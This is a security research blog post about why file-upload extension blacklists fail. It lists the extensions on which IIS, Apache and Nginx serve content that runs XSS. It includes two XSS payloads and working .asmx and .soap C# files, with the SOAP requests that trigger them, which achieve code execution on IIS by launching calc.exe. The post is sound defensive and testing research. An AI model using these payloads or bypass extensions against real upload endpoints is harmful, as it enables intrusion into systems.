---
layout: post
title: Why BlackList < WhiteList
permalink: ExtensionsOverview
---

<div style="text-align:center"><img src = "/public/cat.png"/></div>
Often, when you write the code, which is responsible for file uploading, you check the extensions of downloaded file with using “whitelist” (when you can upload only files with certain extensions) or “blacklist” (when you can upload any files which are not included in the list).



<!--more-->

After the [@ldionmarcil’s](https://twitter.com/ldionmarcil) [post](https://twitter.com/ldionmarcil/status/922553386645454850), I decided to understand how popular web-servers interact with various types of extensions. Firstly, I was interested in which content-type is returned by the web-server on different file types. 

Developers usually include only well-known and obvious extensions in the blacklist. In the article, I want to consider not the wide-spreading file types.

For demonstration PoC, I used the following payloads:
* Basic XSS payload: ```<script>alert(1337)</script>```
* XML-based XSS payload: ```<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1337)</a:script>```

Below I’ll show the results of this little research.

***

## IIS web server

By default, IIS responds with the text/html content-type on the file types, which presented in list below:

Extensions with basic vector:
* .cer
* .hxt
* .htm

![alt text](/public/cer_xss.jpg "cer xss")

Therefore, it is possible to paste the basic XSS vector in the uploaded file, and we will get an alert box in browser after opening the document.
The list below includes extensions on which IIS responds with the content-type which allow to execute XSS via XML-based vector.

Extensions with XML-based vector:
* .dtd
* .mno
* .vml
* .xsl
* .xht
* .svg
* .xml
* .xsd
* .xsf
* .svgz
* .xslt
* .wsdl
* .xhtml

![alt text](/public/mno_xss.png "mno xss")

By default, IIS also supports SSI, however exec section is prohibited for the security reasons

Extensions for SSI:
* .stm
* .shtm
* .shtml

![alt text](/public/SSI_example.png "SSI sorce code")

More detailed information about SSI is written in the [post](https://twitter.com/ldionmarcil/status/922561177636311041) by [@ldionmarcil](https://twitter.com/ldionmarcil)

In addition:

There are also two other interesting extensions (.asmx and .soap) that could lead to arbitrary code execution. It was discovered in collaboration with Yury Aleinov ([@YuryAleinov](https://twitter.com/YuryAleinov)).

#### Asmx extension

1. If you can upload file with .asmx extension, it can lead to arbitrary code execution. For example, we took file with the following content:

   ```csharp
<%@ WebService Language="C#" Class="MyClass" %>
using System.Web.Services;
using System;
using System.Diagnostics;


	[WebService(Namespace="")]
	public class MyClass : WebService 
	{
		[WebMethod]
		public string Pwn_Function()
		{
			Process.Start("calc.exe");
			return "PWNED";
		}
	}

   ```
   ![alt text](/public/asmx_source_example.png "Asmx sorce code")
  
2. Then we sent POST request to the uploaded document:

   ```http
   POST /1.asmx HTTP/1.1
   Host: localhost
   Content-Type: application/soap+xml; charset=utf-8
   Content-Length: 287
   
   <?xml version="1.0" encoding="utf-8"?>
   <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
     <soap12:Body>
       <Pwn_Function/>
     </soap12:Body>
   </soap12:Envelope>
   ```
   ![alt text](/public/asmx_calc_example.png "Run calc")
   
   
3. As the result, IIS executed "calc.exe"

###### Soap extension

Contents of uploaded file with .soap extension:
   ```csharp
<%@ WebService Language="C#" Class="MyClass" %>
using System.Web.Services;
using System;

public class MyClass : MarshalByRefObject
{
    public MyClass() { 
	    System.Diagnostics.Process.Start("calc.exe");
	}		     
}

   ```
SOAP request:
   ```http
POST /1.soap HTTP/1.1
Host: localhost
Content-Length: 283
Content-Type: text/xml; charset=utf-8
SOAPAction: "/"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <MyFunction />
  </soap:Body>
</soap:Envelope>

   ```
   ![alt text](/public/soap_rce.png "Run calc")
   
***

## Apache (httpd or Tomcat)

Extensions with basic vector:
* .shtml
* .html.de or .html.xxx (xxx – any characters)*

Extensions with XML-based vector:
* .rdf 
* .xht 
* .xml 
* .xsl 
* .svg 
* .xhtml 
* .svgz 

\* if there are any characters after “.html.” in the extension, Apache will respond with text/html content-type.

![alt text](/public/html_random.png "xss")

In addition:

Apache returns response without Content-type header on a large number of files with different extensions, which allows an XSS attack, because browser often decides how to handle this page by itself. [This article](http://pwndizzle.blogspot.ru/2015/07/xss-extensions-and-content-types.html) includes detailed information about this question. For example, files with the .xbl and .xml extension are processed similar in Firefox (if there is no Content-Type header in the response), so there is the possibility of exploiting XSS using XML-based vector in this browser.

***

## Nginx

Extensions with basic vector:
* .htm

Extensions with XML-based vector:
* .svg
* .xml
* .svgz

***

>If you find mistakes or you have additional information, please DM me in twitter.
